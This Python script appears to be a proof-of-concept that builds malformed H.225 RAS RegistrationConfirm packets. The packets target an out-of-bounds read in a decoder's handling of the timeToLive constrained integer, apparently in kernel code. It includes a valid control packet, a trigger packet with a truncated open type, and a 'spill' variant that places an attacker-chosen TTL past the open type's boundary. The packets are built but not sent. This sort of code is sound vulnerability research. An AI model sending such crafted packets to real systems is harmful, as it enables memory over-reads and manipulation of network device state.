#!/usr/bin/env python3
"""Build RAS RegistrationConfirm packets exercising decoded timeToLive INT CONS.

The trigger's TTL extension open type contains only the two-bit CONS length
field. Setting that field to 3 requests a four-byte get_uint() read, while only
one byte is in the open type and no packet bytes follow it. The control carries
all four integer octets in bounds.

The valid control includes four trailing bytes required by this decoder's
post-read whole-message bounds check after get_uint() also advances by len.
Those bytes follow the open type and are not part of the encoded TTL value.

This module builds packets only. It does not transmit them or alter a device.
"""


class BitWriter:
    def __init__(self):
        self.bits = []

    def put(self, value, width):
        self.bits.extend((value >> shift) & 1
                         for shift in range(width - 1, -1, -1))

    def align(self):
        self.bits.extend([0] * (-len(self.bits) % 8))

    def octets(self, data):
        self.align()
        for value in data:
            self.put(value, 8)

    def pack(self):
        self.align()
        result = bytearray()
        for offset in range(0, len(self.bits), 8):
            value = 0
            for bit in self.bits[offset:offset + 8]:
                value = (value << 1) | bit
            result.append(value)
        return bytes(result)


def build_registration_confirm(trigger=False, ttl=2):
    w = BitWriter()
    w.put(0, 1)                 # RasMessage CHOICE extension bit
    w.put(4, 5)                 # registrationConfirm (root choice 4)
    w.put(1, 1)                 # RegistrationConfirm has extensions
    w.put(0, 3)                 # three root optional fields absent
    w.octets(b"\x00\x01")      # requestSeqNum (WORD)
    w.octets(b"\x06" + b"\x00" * 6)  # protocolIdentifier OID
    w.octets(b"\x00")          # callSignalAddress SEQOF count = 0
    w.put(0, 7)                 # endpointIdentifier: one BMPString character
    w.align()
    w.octets(b"\x00\x00")      # BMPString character is 16 bits
    w.put(1, 7)                 # extension bitmap length = 2
    w.put(0b01, 2)              # second extension = timeToLive (PER MSB-first)
    w.align()
    if trigger:
        w.octets(b"\x01\xc0")  # open type length 1, CONS len field = 3
    else:
        if not 1 <= ttl <= 0x100000000:
            raise ValueError("ttl must fit the four-byte constrained integer")
        # Four-byte CONS value; timeToLive = encoded value + lb (1).
        # Four post-open bytes let the kernel's final bounds check succeed.
        w.octets(b"\x05\xc0" + (ttl - 1).to_bytes(4, "big") + b"\x00" * 4)
    return w.pack()


def build_spill_trigger(ttl=30):
    """Build a short-open-type RCF whose following packet bytes are a TTL.

    The timeToLive extension declares an open type of one byte (0xc0), which
    contains a CONS length field requesting a four-byte read. The four TTL
    octets follow outside that declared open type, with four more bytes after
    them so decode_int()'s second cursor advance remains within the packet.
    A decoded RCF TTL side effect therefore distinguishes this from a mere
    helper-assigned malformed packet. This proves a component-boundary
    over-read; it does not by itself prove a read beyond the packet allocation.
    """
    if not 1 <= ttl <= 0x100000000:
        raise ValueError("ttl must fit the four-byte constrained integer")
    packet = build_registration_confirm(trigger=True)
    return packet + (ttl - 1).to_bytes(4, "big") + b"\x00" * 4


def inspect_expected_layout(packet, trigger):
    """Small structural assertions for the target extension and OOB boundary."""
    assert packet[:1] == b"\x12"  # ext=0, root CHOICE index 4
    if trigger:
        assert packet[-2:] == b"\x01\xc0"
        assert len(packet) == 19
    else:
        assert packet[-10] == 5
        assert packet[-9] == 0xc0
        assert packet[-4:] == b"\x00" * 4


def inspect_spill_layout(packet, ttl):
    """Check that the one-byte open type is followed by an attacker TTL."""
    assert len(packet) == 27
    assert packet[-10:-8] == b"\x01\xc0"
    assert packet[-8:-4] == (ttl - 1).to_bytes(4, "big")
    assert packet[-4:] == b"\x00" * 4


if __name__ == "__main__":
    for name, is_trigger in (("control", False), ("trigger", True)):
        packet = build_registration_confirm(is_trigger)
        inspect_expected_layout(packet, is_trigger)
        print(f"{name}: {len(packet)} bytes: {packet.hex()}")
    spill = build_spill_trigger(ttl=30)
    inspect_spill_layout(spill, ttl=30)
    print(f"spill-trigger: {len(spill)} bytes: {spill.hex()}")
